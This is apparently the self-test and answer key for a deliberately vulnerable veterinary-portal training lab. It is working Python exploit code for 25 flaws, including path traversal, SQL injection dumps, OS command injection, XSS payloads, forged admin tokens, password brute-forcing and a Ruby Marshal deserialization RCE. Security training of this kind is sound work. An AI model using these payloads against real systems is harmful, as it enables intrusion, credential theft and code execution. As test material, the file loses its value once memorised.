#!/usr/bin/env python3
"""Lab self-test: proves every intended finding is exploitable end-to-end.
SPOILERS - this file is the answer key in executable form.

Usage:  python3 tests/selftest.py [base_url]     (default http://127.0.0.1:8095)
Needs:  python3-requests, and docker access (for building the Ruby Marshal payload).
Run it against a FRESH lab (./reset.sh) - it creates throw-away accounts.
"""
import base64, hashlib, json, re, subprocess, sys, time, uuid
import requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else 'http://127.0.0.1:8095').rstrip('/')
RESULTS = []


def check(num, name):
    def deco(fn):
        def run():
            try:
                ok, detail = fn()
            except Exception as e:  # noqa
                ok, detail = False, '%s: %s' % (type(e).__name__, e)
            RESULTS.append((num, name, ok, detail))
            print('[%s] %02d %-48s %s' % ('PASS' if ok else 'FAIL', num, name, detail[:110]))
        run.num = num
        return run
    return deco


def new_client(prefix='t'):
    s = requests.Session()
    email = '%s.%s@example.test' % (prefix, uuid.uuid4().hex[:8])
    pw = 'Passw0rd!%s' % uuid.uuid4().hex[:4]
    r = s.post(BASE + '/register', data={'full_name': 'Test %s' % prefix, 'email': email, 'phone': '555-0000',
                                         'password': pw, 'password_confirm': pw}, allow_redirects=False)
    assert r.status_code in (302, 303), 'register failed %s' % r.status_code
    return s, email, pw


def add_pet(s, name='Biscuit'):
    r = s.post(BASE + '/pets', data={'name': name, 'species': 'Dog', 'breed': 'Mutt'}, allow_redirects=False)
    return int(r.headers['Location'].rstrip('/').split('/')[-1])


def make_staff(s):
    r = s.patch(BASE + '/api/v1/me', json={'account_type': 'staff'})
    assert r.json()['account_type'] == 'staff'


S, EMAIL, PW = new_client('main')
PET = add_pet(S)


@check(1, 'Path traversal (records download)')
def t1():
    r = S.get(BASE + '/records/download', params={'file': '....//....//....//....//etc/passwd'})
    r2 = S.get(BASE + '/records/download', params={'file': '....//....//app.rb'})
    return ('root:x:0:0' in r.text and 'class PawPortal' in r2.text), 'etc/passwd + app source read (%d/%d)' % (r.status_code, r2.status_code)


@check(2, 'CSRF (contact email change, GET+POST)')
def t2():
    s, email, _ = new_client('csrf')
    new = 'attacker.%s@evil.test' % uuid.uuid4().hex[:6]
    r = s.post(BASE + '/account/contact', data={'email': new}, headers={'Origin': 'http://evil.test', 'Referer': 'http://evil.test/x.html'}, allow_redirects=False)
    me = s.get(BASE + '/api/v1/me').json()
    new2 = 'attacker2.%s@evil.test' % uuid.uuid4().hex[:6]
    s.get(BASE + '/account/contact', params={'email': new2}, allow_redirects=False)
    me2 = s.get(BASE + '/api/v1/me').json()
    return (me['email'] == new and me2['email'] == new2), 'cross-origin POST and GET both changed email'


@check(3, 'Directory listing (/intake/)')
def t3():
    r = requests.get(BASE + '/intake/archive/')
    f = requests.get(BASE + '/intake/archive/client-export-2026-09.csv')
    return ('Index of' in r.text and 'client-export-2026-09.csv' in r.text
            and 'jessica.moore@example.net' in f.text), 'auto-index + client PII export'


@check(4, 'SSRF (pet photo import -> /internal)')
def t4():
    direct = requests.get(BASE + '/internal/diagnostics')
    r = S.post(BASE + '/pets/%d/photo' % PET, data={'photo_url': 'http://127.0.0.1:8080/internal/diagnostics'})
    return (direct.status_code == 403 and 'token_signing_key' in r.text and 'Pawp0rtal_Db' in r.text), 'direct=403, via SSRF leaks secrets'


@check(5, 'Secret in client-side source (portal.js)')
def t5():
    js = requests.get(BASE + '/assets/js/portal.js').text
    key = re.search(r"CLINIC_KEY = '([^']+)'", js).group(1)
    r = requests.get(BASE + '/api/v1/staff/roster', headers={'X-Clinic-Key': key})
    return (r.status_code == 200 and 'olivia.grant@willowbrookvets.com' in r.text), 'key %s works on roster API' % key


@check(6, 'CORS misconfiguration (reflected origin + creds)')
def t6():
    r = S.get(BASE + '/api/v1/me', headers={'Origin': 'https://evil.example'})
    return (r.headers.get('Access-Control-Allow-Origin') == 'https://evil.example'
            and r.headers.get('Access-Control-Allow-Credentials') == 'true' and EMAIL in r.text), 'ACAO reflects arbitrary origin w/ credentials'


@check(7, 'Environment variable exposure (health?debug)')
def t7():
    r = requests.get(BASE + '/api/v1/health', params={'debug': 'true'}).json()
    return ('DB_PASS' in r.get('environment', {}) and 'TOKEN_SIGNING_KEY' in r['environment']), 'ENV dumped incl. DB_PASS/TOKEN_SIGNING_KEY'


@check(8, 'Session cookie without HttpOnly')
def t8():
    r = requests.get(BASE + '/')
    sc = r.headers.get('Set-Cookie', '')
    return ('wb_sid=' in sc and 'httponly' not in sc.lower()), sc


@check(9, 'Known-vulnerable components (jQuery 2.2.4, Bootstrap 3.3.7)')
def t9():
    home = requests.get(BASE + '/').text
    j = requests.get(BASE + '/assets/vendor/jquery-2.2.4.min.js').text[:80]
    b = requests.get(BASE + '/assets/vendor/bootstrap-3.3.7/js/bootstrap.min.js').text[:80]
    return ('jquery-2.2.4' in home and 'v2.2.4' in j and 'v3.3.7' in b), 'jQuery v2.2.4 + Bootstrap v3.3.7 served'


@check(10, 'Cleartext transmission (HTTP only, no HSTS)')
def t10():
    r = requests.get(BASE + '/login')
    return (BASE.startswith('http://') and 'action="/login"' in r.text and 'Strict-Transport-Security' not in r.headers), 'credentials posted over plain HTTP'


@check(11, 'Weak password hashing (unsalted MD5)')
def t11():
    d = S.get(BASE + '/api/v1/me').json()
    return d.get('pwd_digest') == hashlib.md5(PW.encode()).hexdigest(), 'pwd_digest == md5(password)'


@check(12, 'OS command injection (chart export)')
def t12():
    s, _, _ = new_client('cmdi')
    make_staff(s)
    r = s.post(BASE + '/staff/charts/export', data={'pet_id': '1', 'archive_name': 'x; id; uname -a #'})
    return ('uid=1001(wbapp)' in r.text), 'id executed as wbapp'


@check(13, 'Reflected XSS (find-a-vet, JS string context)')
def t13():
    p = '";alert(document.domain);//'
    r = requests.get(BASE + '/find-a-vet', params={'q': p})
    return ('var lastSearch = "";alert(document.domain);//";' in r.text), 'breaks out of JS string'


@check(14, 'Stored XSS (appointment reason -> staff queue)')
def t14():
    s, _, _ = new_client('sxss')
    pet = add_pet(s, 'Pixel')
    slots = s.get(BASE + '/api/v1/slots', params={'vet_id': 3, 'date': time.strftime('%Y-%m-%d', time.localtime(time.time() + 86400 * 5))}).json()
    payload = '<img src=x onerror=alert(document.cookie)>'
    r = s.post(BASE + '/appointments', data={'pet_id': pet, 'slot_id': slots[-1]['id'], 'reason': payload})
    st, _, _ = new_client('sxss2')
    make_staff(st)
    q = st.get(BASE + '/staff').text
    return (payload in r.text and payload in q), 'payload raw in owner view and staff queue'


@check(15, 'SQL injection (slots API vet_id, UNION)')
def t15():
    inj = "0 UNION SELECT setting_key, setting_value, 3 FROM clinic_settings-- -"
    r = S.get(BASE + '/api/v1/slots', params={'vet_id': inj, 'date': time.strftime('%Y-%m-%d')})
    inj2 = "0 UNION SELECT email, pwd_hash, account_type FROM users-- -"
    r2 = S.get(BASE + '/api/v1/slots', params={'vet_id': inj2, 'date': time.strftime('%Y-%m-%d')})
    return ('backup_passphrase' in r.text and 'olivia.grant' in r2.text), 'dumped clinic_settings + users'


@check(16, 'Incorrect privilege assignment (mass assignment)')
def t16():
    s, _, _ = new_client('priv')
    before = s.get(BASE + '/staff', allow_redirects=False).status_code
    s.patch(BASE + '/api/v1/me', json={'account_type': 'admin'})
    after = s.get(BASE + '/admin').text
    return (before in (302, 303) and 'User accounts' in after), 'client -> admin via PATCH /api/v1/me'


@check(17, 'Clickjacking (no frame protection)')
def t17():
    r = S.get(BASE + '/account')
    csp = r.headers.get('Content-Security-Policy', '')
    return ('X-Frame-Options' not in r.headers and 'frame-ancestors' not in csp), 'no XFO / frame-ancestors on /account'


@check(18, 'Improper authentication (unsigned bearer token)')
def t18():
    tok = requests.post(BASE + '/api/v1/auth/token', json={'email': EMAIL, 'password': PW}).json()['access_token']
    bad = requests.get(BASE + '/api/v1/admin/users', headers={'Authorization': 'Bearer ' + tok})
    payload = base64.urlsafe_b64encode(json.dumps({'uid': 1, 'role': 'admin'}).encode()).decode().rstrip('=')
    r = requests.get(BASE + '/api/v1/admin/users', headers={'Authorization': 'Bearer %s.' % payload})
    return (bad.status_code == 403 and r.status_code == 200 and 'pwd_hash' in r.text), 'forged unsigned uid=1 token accepted'


@check(19, 'Single-factor auth / no lockout (staff brute force)')
def t19():
    s = requests.Session()
    words = ['password', '123456', 'letmein', 'qwerty', 'admin123', 'iloveyou', 'monkey', 'dragon', 'sunshine', 'princess',
             'football', 'welcome', 'abc123', 'master', 'shadow', 'welcome1', 'password1', 'welcome123']
    hit = None
    for w in words:
        r = s.post(BASE + '/staff/login', data={'email': 'amelia.hart@willowbrookvets.com', 'password': w}, allow_redirects=False)
        if r.status_code in (302, 303) and r.headers['Location'].endswith('/staff'):
            hit = w
            break
    return (hit == 'welcome123'), '%d attempts, no lockout/MFA, password=%s' % (words.index(hit) + 1 if hit else -1, hit)


@check(20, 'Session fixation (attacker-chosen sid survives login)')
def t20():
    fixed = 'fixated' + uuid.uuid4().hex[:16]
    victim = requests.Session()
    victim.get(BASE + '/m/handoff', params={'sid': fixed, 'next': '/login'}, allow_redirects=False)
    victim.cookies.set('wb_sid', fixed)
    victim.post(BASE + '/login', data={'email': EMAIL, 'password': PW}, allow_redirects=False)
    attacker = requests.Session()
    attacker.cookies.set('wb_sid', fixed)
    me = attacker.get(BASE + '/api/v1/me')
    h = requests.get(BASE + '/m/handoff', params={'sid': fixed}, allow_redirects=False).headers.get('Set-Cookie', '')
    return (me.status_code == 200 and me.json()['email'] == EMAIL and fixed in h), 'handoff sets sid; not rotated at login'


@check(21, 'Weak password recovery (4-digit code, no limit, enum)')
def t21():
    s, email, _ = new_client('reset')
    enum = requests.post(BASE + '/forgot', data={'email': 'nobody.%s@example.test' % uuid.uuid4().hex[:5]}).text
    requests.post(BASE + '/forgot', data={'email': email})
    st = requests.Session()
    st.post(BASE + '/staff/login', data={'email': 'amelia.hart@willowbrookvets.com', 'password': 'welcome123'})
    log = st.get(BASE + '/staff/activity').text
    code = re.search(r'reset_requested email=%s code=(\d{4})' % re.escape(email), log).group(1)
    for wrong in range(25):  # demonstrate no attempt limit
        c = '%04d' % ((int(code) + 1 + wrong) % 10000)
        requests.post(BASE + '/forgot/verify', data={'email': email, 'code': c, 'new_password': 'pwned123'})
    r = requests.post(BASE + '/forgot/verify', data={'email': email, 'code': code, 'new_password': 'pwned123'}, allow_redirects=False)
    ok_login = requests.post(BASE + '/login', data={'email': email, 'password': 'pwned123'}, allow_redirects=False)
    return ('find an account' in enum and r.status_code in (302, 303) and ok_login.status_code in (302, 303)), '25 bad guesses then reset ok; user enum'


def _marshal_int(n):
    if n == 0:
        return b'\x00'
    if 1 <= n <= 122:
        return bytes([n + 5])
    out, nn = bytearray(), n
    while nn > 0:
        out.append(nn & 0xff)
        nn >>= 8
    return bytes([len(out)]) + bytes(out)


def _marshal_sym(s):
    b = s.encode()
    return b':' + _marshal_int(len(b)) + b


def _marshal_str(s):
    b = s.encode()
    return b'"' + _marshal_int(len(b)) + b


@check(22, 'Insecure deserialization (Marshal draft cookie -> RCE)')
def t22():
    # Confirm the draft cookie is a raw Ruby Marshal blob (magic 04 08).
    S.post(BASE + '/appointments/draft', data={'pet_id': PET, 'vet_id': 1, 'date': '2030-01-01', 'slot_id': 0, 'reason': 'x'}, allow_redirects=False)
    raw = base64.urlsafe_b64decode(requests.utils.unquote(S.cookies.get('wb_draft')))
    assert raw[:2] == b'\x04\x08' and b'reminder_template' in raw
    # Hand-craft a Marshal object (no server access needed) whose @reminder_template is an ERB RCE.
    payload_tmpl = "<%= IO.popen('id').read %>"
    obj = (b'\x04\x08o' + _marshal_sym('Clinic::BookingDraft') + _marshal_int(1)
           + _marshal_sym('@reminder_template') + _marshal_str(payload_tmpl))
    evil = base64.urlsafe_b64encode(obj).decode().rstrip('=')
    # send a single explicit Cookie header (requests would otherwise keep a duplicate wb_draft)
    r = requests.get(BASE + '/appointments/book',
                     headers={'Cookie': 'wb_sid=%s; wb_draft=%s' % (S.cookies.get('wb_sid'), evil)})
    return ('uid=1001(wbapp)' in r.text), 'forged Marshal object -> ERB command execution'


@check(23, 'Sensitive data in logs (activity log)')
def t23():
    s, _, _ = new_client('logview')
    make_staff(s)
    log = s.get(BASE + '/staff/activity').text
    has_creds = 'new_password=' in log and 'password=' in log
    return has_creds, 'plaintext passwords/reset codes readable in staff activity log'


@check(24, 'Improper exception handling (verbose 500 leaks SQL/stack)')
def t24():
    r = S.get(BASE + '/api/v1/slots', params={'vet_id': "1'", 'date': time.strftime('%Y-%m-%d')})
    body = r.text
    leaks = ('Mysql2::Error' in body or 'SQL syntax' in body) and ('"query"' in body or 'slot_date' in body)
    html = S.get(BASE + '/records/download', params={'file': 'x'}).status_code
    return (r.status_code == 500 and leaks), 'raw DB error + failing SQL + backtrace returned to client'


@check(25, 'IDOR (other users\' invoices via enumerable id)')
def t25():
    # invoice 1003 belongs to a seeded client (David Chen), not us
    r = S.get(BASE + '/invoices/1003')
    return ('David Chen' in r.text and 'TPLO' in r.text), 'read another client invoice (PII + billing) by id'


def main():
    print('Willowbrook PawPortal - lab self-test\nTarget: %s\n' % BASE + '-' * 72)
    tests = [v for k, v in sorted(globals().items()) if callable(v) and getattr(v, 'num', None)]
    tests.sort(key=lambda f: f.num)
    for t in tests:
        t()
    print('-' * 72)
    passed = sum(1 for _, _, ok, _ in RESULTS if ok)
    total = len(RESULTS)
    print('RESULT: %d/%d findings verified exploitable' % (passed, total))
    if passed != total:
        print('\nFAILURES:')
        for n, name, ok, detail in RESULTS:
            if not ok:
                print('  %02d %s -> %s' % (n, name, detail))
    sys.exit(0 if passed == total else 1)


if __name__ == '__main__':
    main()
